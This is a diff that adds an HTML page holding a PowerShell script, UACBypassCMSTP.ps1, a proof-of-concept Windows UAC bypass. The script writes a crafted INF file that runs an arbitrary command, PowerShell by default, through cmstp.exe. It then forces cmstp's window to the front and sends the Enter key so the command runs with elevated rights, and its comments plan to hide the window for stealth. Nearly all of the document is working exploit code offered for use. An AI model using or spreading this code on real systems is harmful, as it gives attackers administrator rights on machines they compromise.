@@ -1,0 +1,138 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>UACBypassCMSTP.ps1</title>
+</head><body>#UACBypassCMSTP.ps1<br/>
+# UAC Bypass poc using SendKeys<br/>
+# Version 1.0<br/>
+# Author: Oddvar Moe<br/>
+# Functions borrowed from: https://powershell.org/forums/topic/sendkeys/<br/>
+# Todo: Hide window on screen for stealth<br/>
+# Todo: Make script edit the INF file for command to inject...<br/>
+<br/>
+<br/>
+Function script:Set-INFFile {<br/>
+[CmdletBinding()]<br/>
+	Param (<br/>
+	[Parameter(HelpMessage=&quot;Specify the INF file location&quot;)]<br/>
+	$InfFileLocation = &quot;$env:temp\CMSTP.inf&quot;,<br/>
+	<br/>
+	[Parameter(HelpMessage=&quot;Specify the command to launch in a UAC-privileged window&quot;)]<br/>
+	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'<br/>
+	)<br/>
+<br/>
+$InfContent = @&quot;<br/>
+[version]<br/>
+Signature=`$chicago`$<br/>
+AdvancedINF=2.5<br/>
+[DefaultInstall]<br/>
+CustomDestination=CustInstDestSectionAllUsers<br/>
+RunPreSetupCommands=RunPreSetupCommandsSection<br/>
+[RunPreSetupCommandsSection]<br/>
+; Commands Here will be run Before Setup Begins to install<br/>
+$CommandToExecute<br/>
+taskkill /IM cmstp.exe /F<br/>
+[CustInstDestSectionAllUsers]<br/>
+49000,49001=AllUSer_LDIDSection, 7<br/>
+[AllUSer_LDIDSection]<br/>
+&quot;HKLM&quot;, &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;, &quot;ProfileInstallPath&quot;, &quot;%UnexpectedError%&quot;, &quot;&quot;<br/>
+[Strings]<br/>
+ServiceName=&quot;CorpVPN&quot;<br/>
+ShortSvcName=&quot;CorpVPN&quot;<br/>
+&quot;@<br/>
+<br/>
+$InfContent | Out-File $InfFileLocation -Encoding ASCII<br/>
+}<br/>
+<br/>
+<br/>
+Function Get-Hwnd<br/>
+{<br/>
+ [CmdletBinding()]<br/>
+  <br/>
+ Param<br/>
+ (<br/>
+  [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName<br/>
+ )<br/>
+ Process<br/>
+  {<br/>
+    $ErrorActionPreference = 'Stop'<br/>
+    Try <br/>
+    {<br/>
+      $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle<br/>
+    }<br/>
+    Catch <br/>
+    {<br/>
+      $hwnd = $null<br/>
+    }<br/>
+    $hash = @{<br/>
+    ProcessName = $ProcessName<br/>
+    Hwnd    = $hwnd<br/>
+    }<br/>
+    <br/>
+  New-Object -TypeName PsObject -Property $hash<br/>
+  }<br/>
+}<br/>
+<br/>
+function Set-WindowActive<br/>
+{<br/>
+ [CmdletBinding()]<br/>
+<br/>
+ Param<br/>
+ (<br/>
+  [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name<br/>
+ )<br/>
+ <br/>
+ Process<br/>
+ {<br/>
+  $memberDefinition = @'<br/>
+  [DllImport(&quot;user32.dll&quot;)] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);<br/>
+  [DllImport(&quot;user32.dll&quot;, SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);<br/>
+'@<br/>
+<br/>
+  Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32<br/>
+  $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd<br/>
+  If ($hwnd) <br/>
+  {<br/>
+   $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)<br/>
+   [User32.Api]::SetForegroundWindow($hwnd)<br/>
+   [User32.Api]::ShowWindow($hwnd, 5)<br/>
+  }<br/>
+  Else <br/>
+  {<br/>
+   [string] $hwnd = 'N/A'<br/>
+  }<br/>
+<br/>
+  $hash = @{<br/>
+   Process = $Name<br/>
+   Hwnd  = $hwnd<br/>
+  }<br/>
+    <br/>
+  New-Object -TypeName PsObject -Property $hash<br/>
+ }<br/>
+}<br/>
+<br/>
+. Set-INFFile<br/>
+#Needs Windows forms<br/>
+add-type -AssemblyName System.Windows.Forms<br/>
+If (Test-Path $InfFileLocation) {<br/>
+#Command to run<br/>
+$ps = new-object system.diagnostics.processstartinfo &quot;c:\windows\system32\cmstp.exe&quot;<br/>
+$ps.Arguments = &quot;/au $InfFileLocation&quot;<br/>
+$ps.UseShellExecute = $false<br/>
+<br/>
+#Start it<br/>
+[system.diagnostics.process]::Start($ps)<br/>
+<br/>
+do<br/>
+{<br/>
+	# Do nothing until cmstp is an active window<br/>
+}<br/>
+until ((Set-WindowActive cmstp).Hwnd -ne 0)<br/>
+<br/>
+<br/>
+#Activate window<br/>
+Set-WindowActive cmstp<br/>
+<br/>
+#Send the Enter key<br/>
+[System.Windows.Forms.SendKeys]::SendWait(&quot;{ENTER}&quot;)<br/>
+}</body></html>
